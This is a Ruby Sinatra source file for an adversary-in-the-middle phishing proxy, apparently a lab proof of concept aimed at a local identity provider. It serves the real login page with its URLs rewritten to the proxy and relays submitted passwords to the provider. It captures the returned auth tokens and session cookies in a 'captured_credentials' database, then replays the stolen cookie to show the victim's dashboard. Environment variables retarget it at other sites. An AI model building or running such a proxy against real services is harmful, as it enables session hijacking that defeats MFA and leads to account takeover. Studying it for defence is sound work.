#----------------------------------
#       PROXY - AiTM
#----------------------------------

require 'sinatra/base'
require 'sinatra/contrib'
require 'faraday'
require 'sequel'
require 'sqlite3'
require 'dotenv/load'
require 'uri'

# DB propia del proxy — separada del IdP
# En el ataque real el atacante tiene su propio servidor
PROXY_DB = Sequel.connect("sqlite://#{__dir__}/../captured_credentials.db")

PROXY_DB.create_table?(:captured_credentials) do
  primary_key :id
  String   :email
  String   :token
  String   :ip
  String   :user_agent
  String   :session_cookie
  DateTime :captured_at
end

IDP_URL   = ENV['IDP_URL']   || 'http://localhost:4444'
PROXY_URL = ENV['PROXY_URL'] || 'http://localhost:4445'

class AvatarProxy < Sinatra::Base
  use Rack::Session::Cookie,
      key: "proxy_session",
      secret: "proxy_vaatu_secret_future_industries_poc_2024_long_enough_string"

  set :public_folder, File.join(__dir__, '..', 'public')
  set :static, true

  helpers do
    def rewrite_html(html)
      html.gsub(IDP_URL, PROXY_URL)
          .gsub("localhost:4444", "localhost:4445")
    end
  end

  get "/" do
    redirect "/login"
  end

  get "/login" do
    idp_response = Faraday.get("#{IDP_URL}/login")
    content_type 'text/html'
    rewrite_html(idp_response.body)
  end

  post "/login" do
    email    = params[:email].to_s.downcase.strip
    password = params[:password].to_s

    puts "Proxy: Received login attempt for #{email}"

    idp_response = Faraday.new do |f|
      f.options[:follow_redirects] = false
    end.post("#{IDP_URL}/login") do |req|
      req.headers['Content-Type'] = 'application/x-www-form-urlencoded'
      req.body = URI.encode_www_form({
        email:    email,
        password: password
      })
    end

    puts "Proxy: IDP response status: #{idp_response.status}"
    puts "Proxy: IDP response location: #{idp_response.headers['location']}"

    if idp_response.status == 302
      location       = idp_response.headers['location']
      token          = location.match(/token=(.+)/)[1] rescue nil
      raw_cookie     = idp_response.headers['set-cookie']
      session_cookie = raw_cookie.split(';').first rescue nil

      puts "Proxy: Extracted token: #{token}"
      puts "Proxy: Extracted session_cookie: #{session_cookie}"

      if token && session_cookie
        # Guarda en la DB propia del proxy
        PROXY_DB[:captured_credentials].insert(
          email:          email,
          token:          token,
          ip:             request.ip,
          user_agent:     request.user_agent,
          session_cookie: session_cookie,
          captured_at:    Time.now
        )

        session[:user]       = email
        session[:token]      = token
        session[:idp_cookie] = session_cookie

        puts "Proxy: Redirecting to /dashboard"
        redirect "/dashboard"
      else
        puts "Proxy: Token or session_cookie missing, showing login again"
        content_type 'text/html'
        rewrite_html(Faraday.get("#{IDP_URL}/login").body)
      end
    else
      puts "Proxy: IDP did not return 302, showing login again"
      content_type 'text/html'
      rewrite_html(Faraday.get("#{IDP_URL}/login").body)
    end
  end

  get "/dashboard" do
    puts "Proxy: Accessing /dashboard, session[:user]: #{session[:user]}"
    halt 401, "Not authorized" unless session[:user]

    puts "Proxy: Fetching dashboard from IDP with cookie: #{session[:idp_cookie]}"
    idp_response = Faraday.get("#{IDP_URL}/dashboard") do |req|
      req.headers['Cookie'] = session[:idp_cookie]
    end

    puts "Proxy: IDP dashboard response status: #{idp_response.status}"
    content_type 'text/html'
    rewrite_html(idp_response.body)
  end

  get "/logout" do
    session.clear
    redirect "/login"
  end
end